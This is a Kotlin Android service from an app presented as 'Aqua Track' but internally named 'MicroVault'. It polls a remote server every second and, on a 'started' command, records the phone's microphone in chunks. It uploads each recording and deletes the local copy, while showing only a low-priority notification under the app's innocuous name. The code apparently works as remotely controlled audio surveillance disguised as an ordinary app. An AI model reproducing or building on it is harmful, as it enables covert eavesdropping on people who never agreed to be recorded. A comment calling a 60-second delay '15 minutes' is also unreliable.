package com.example.aquatrack.recording

import android.app.*
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.aquatrack.LoginActivity
import com.example.aquatrack.R
import com.example.aquatrack.api.RecordingApiService
import com.example.aquatrack.util.NetworkManager
import com.example.aquatrack.util.StorageManager
import kotlinx.coroutines.*
import java.io.File

class AudioRecordingService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val apiService by lazy { RecordingApiService(applicationContext) }

    private var phoneId: Int = -1
    private lateinit var queueDir: File

    private var recordingJob: Job? = null
    private var monitoringJob: Job? = null

    private var isRecording = false
    private var currentFile: File? = null
    private var recorder: MediaRecorder? = null

    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Always call startForeground immediately to avoid RemoteServiceException
        startForeground(
            1,
            getNotification("MicroVault starting..."),
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0
        )

        // Check RECORD_AUDIO permission after starting foreground
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted. Stopping service.")
            // Update notification to inform user
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.notify(1, getNotification("Microphone permission required"))
            stopSelf()
            return
        }

        val prefs = getSharedPreferences("microvault", MODE_PRIVATE)
        phoneId = prefs.getInt("phone_id", -1)
        queueDir = StorageManager.getRecordingsDirectory(applicationContext)

        // Update notification to active
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(1, getNotification("MicroVault active"))

        // Clean up old recordings on startup
        StorageManager.cleanupOldRecordings(queueDir)

        startMonitoring()
    }

    private fun startMonitoring() {
        monitoringJob = scope.launch {
            while (isActive) {
                if (NetworkManager.isNetworkAvailable(applicationContext)) {
                    val status = try {
                        apiService.getStatus(phoneId)
                    } catch (e: Exception) {
                        Log.e("AudioService", "Status check failed", e)
                        null
                    }

                    Log.d("AudioService", "Status: $status")

                    when (status) {
                        "started" -> if (!isRecording) startRecordingLoop()
                        "stopped" -> if (isRecording) stopRecordingLoop()
                    }
                }

                delay(1000)
            }
        }
    }

    private fun startRecordingLoop() {
        recordingJob?.cancel()
        recordingJob = scope.launch {
            while (isActive) {
                startNewChunk()
                delay(60_000) // 15 minutes
                stopAndQueue()
            }
        }
        isRecording = true
        Log.d("AudioService", "Recording loop started.")
    }

    private fun stopRecordingLoop() {
        recordingJob?.cancel()
        stopAndQueue()
        recordingJob = null
        isRecording = false
        Log.d("AudioService", "Recording loop stopped.")
    }

    private fun startNewChunk() {
        stopAndQueue() // just in case

        // Check available space before starting
        if (!StorageManager.ensureAvailableSpace(queueDir, REQUIRED_SPACE)) {
            Log.w("AudioService", "Not enough storage space available")
            StorageManager.cleanupOldRecordings(queueDir) // Try to free up space
            return
        }

        val timestamp = System.currentTimeMillis()
        currentFile = File(queueDir, "audio_$timestamp.m4a")

        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(applicationContext)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(currentFile!!.absolutePath)
            prepare()
            start()
        }

        Log.d("AudioService", "Recording started: ${currentFile?.name}")
    }

    private fun stopAndQueue() {
        if (recorder == null) return
        try {
            recorder?.stop()
            recorder?.release()
            Log.d("AudioService", "Recorded: ${currentFile?.name}")
        } catch (e: IllegalStateException) {
            Log.w("AudioService", "Recorder already stopped.")
        } catch (e: Exception) {
            Log.e("AudioService", "Error stopping recorder", e)
        } finally {
            recorder = null
        }

        // upload in background
        currentFile?.let { file ->
            scope.launch {
                val success = apiService.uploadRecording(phoneId, file)
                if (success) {
                    file.delete()
                    Log.d("AudioService", "Uploaded and deleted: ${file.name}")
                } else {
                    Log.w("AudioService", "Failed to upload: ${file.name}")
                }
            }
        }
    }

    override fun onDestroy() {
        monitoringJob?.cancel()
        recordingJob?.cancel()
        stopAndQueue()
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun getNotification(content: String): Notification {
        val intent = Intent(this, LoginActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, "microvault")
            .setContentTitle("Aqua Track")
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_lock_silent_mode) // Use a built-in Android icon as a placeholder
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "microvault",
                "MicroVault Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        private const val TAG = "AudioService"
        private const val REQUIRED_SPACE = 10 * 1024 * 1024L // 10MB minimum required space
    }
}
